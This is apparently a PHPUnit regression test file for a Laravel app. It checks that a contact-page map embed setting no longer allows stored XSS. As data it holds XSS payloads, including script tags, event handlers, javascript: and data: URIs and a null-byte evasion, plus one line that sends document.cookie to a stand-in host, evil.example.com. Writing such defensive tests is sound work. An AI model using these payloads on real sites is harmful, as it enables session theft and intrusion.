<?php

namespace Tests\Feature;

use App\Services\MapEmbedService;
use App\Services\SettingsService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * SEC-04 regression coverage.
 *
 * `contact_map_embed` used to be rendered with `{!! !!}` straight from the
 * settings table, making it a stored-XSS sink for anyone able to write settings
 * (direct DB access, a seeder, or a restored backup). The contact page must now
 * only ever emit an iframe that the application itself constructed.
 */
class ContactMapEmbedTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        SettingsService::clearCache();
    }

    private function setEmbed(string $value): void
    {
        SettingsService::set('contact_map_embed', $value);
        SettingsService::clearCache();
    }

    public function test_legitimate_google_maps_iframe_still_renders(): void
    {
        $this->setEmbed(
            '<iframe src="https://www.google.com/maps/embed?pb=!1m18!1sabc" width="600" height="450" style="border:0" allowfullscreen loading="lazy"></iframe>'
        );

        $response = $this->get(route('contact'));

        $response->assertStatus(200);
        $response->assertSee('https://www.google.com/maps/embed?pb=!1m18!1sabc', false);
        $response->assertSee('<iframe src="https://www.google.com/maps/embed', false);
    }

    public function test_bare_google_maps_url_is_accepted(): void
    {
        $this->setEmbed('https://www.google.com/maps/embed?pb=!1m18!1sxyz');

        $response = $this->get(route('contact'));

        $response->assertStatus(200);
        $response->assertSee('https://www.google.com/maps/embed?pb=!1m18!1sxyz', false);
    }

    public function test_script_tag_payload_never_reaches_the_page(): void
    {
        $this->setEmbed('<script>alert(document.cookie)</script>');

        $response = $this->get(route('contact'));

        $response->assertStatus(200);
        $response->assertDontSee('<script>alert(document.cookie)</script>', false);
        $response->assertDontSee('alert(document.cookie)', false);
    }

    public function test_iframe_with_event_handler_is_rejected(): void
    {
        $this->setEmbed(
            '<iframe src="https://www.google.com/maps/embed?pb=1" onload="alert(1)"></iframe>'
        );

        $response = $this->get(route('contact'));

        $response->assertStatus(200);
        // Note: the frontend layout legitimately uses onload="this.media='all'"
        // for async CSS, so assert on the payload rather than the bare word.
        $response->assertDontSee('onload="alert(1)"', false);
        $response->assertDontSee('alert(1)', false);
    }

    public function test_iframe_with_non_google_src_is_rejected(): void
    {
        $this->setEmbed('<iframe src="https://evil.example.com/maps/embed?pb=1"></iframe>');

        $response = $this->get(route('contact'));

        $response->assertStatus(200);
        $response->assertDontSee('evil.example.com', false);
    }

    public function test_combined_payload_is_fully_neutralised(): void
    {
        $this->setEmbed(
            '<iframe src="https://evil.example.com/x" onload="alert(1)"></iframe>'
            . '<script>fetch("//evil.example.com/"+document.cookie)</script>'
        );

        $response = $this->get(route('contact'));

        $response->assertStatus(200);
        $response->assertDontSee('evil.example.com', false);
        $response->assertDontSee('onload="alert(1)"', false);
        $response->assertDontSee('<script>fetch', false);
    }

    #[DataProvider('maliciousValues')]
    public function test_service_rejects_malicious_values(string $value): void
    {
        $this->assertNull(MapEmbedService::iframe($value), $value);
        $this->assertNull(MapEmbedService::url($value), $value);
    }

    /** @return array<string, array{0: string}> */
    public static function maliciousValues(): array
    {
        return [
            'script tag'           => ['<script>alert(1)</script>'],
            'event handler'        => ['<iframe src="https://www.google.com/maps/embed" onerror="alert(1)"></iframe>'],
            'javascript scheme'    => ['<iframe src="javascript:alert(1)"></iframe>'],
            'bare javascript url'  => ['javascript:alert(1)'],
            'data uri'             => ['<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'],
            'srcdoc'               => ['<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
            'foreign host'         => ['<iframe src="https://evil.example.com/maps"></iframe>'],
            'google lookalike'     => ['<iframe src="https://google.com.evil.test/maps"></iframe>'],
            'http downgrade'       => ['<iframe src="http://www.google.com/maps/embed"></iframe>'],
            'wrong path'           => ['https://www.google.com/evil'],
            'credentials in url'   => ['https://user:pass@www.google.com/maps/embed'],
            'trailing script'      => ['<iframe src="https://www.google.com/maps/embed"></iframe><script>alert(1)</script>'],
            'null byte evasion'    => ["java\0script:alert(1)"],
            'empty'                => ['   '],
        ];
    }

    public function test_service_accepts_regional_google_domains(): void
    {
        $this->assertNotNull(MapEmbedService::url('https://maps.google.co.id/maps/embed?pb=1'));
        $this->assertNotNull(MapEmbedService::url('https://www.google.com/maps/embed?pb=1'));
    }

    public function test_generated_iframe_escapes_the_url(): void
    {
        $html = MapEmbedService::iframe('https://www.google.com/maps/embed?pb=a&b=%22c');

        $this->assertNotNull($html);
        $this->assertStringNotContainsString('?pb=a&b="c', $html);
        $this->assertStringContainsString('&amp;', $html);
    }
}
